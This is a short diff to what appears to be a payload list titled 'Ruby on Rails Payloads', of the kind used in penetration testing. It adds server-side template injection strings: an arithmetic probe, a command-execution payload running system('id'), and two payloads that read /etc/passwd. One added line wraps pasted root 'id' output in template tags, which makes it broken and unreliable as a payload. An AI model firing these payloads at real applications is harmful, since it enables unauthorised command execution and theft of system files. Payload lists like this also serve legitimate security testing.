@@ -1,2 +1,8 @@
--e # rails Payload 10
+-e # Ruby on Rails Payloads
 # Version: 1.0.15-20260301-Minggu-1621-WIB
+
+<%= 7*7 %>
+<%= system('id') %>
+<%= File.read('/etc/passwd') %>
+<%= uid=0(root) gid=0(root) groups=0(root) %>
+<%= File.open('/etc/passwd').read %>
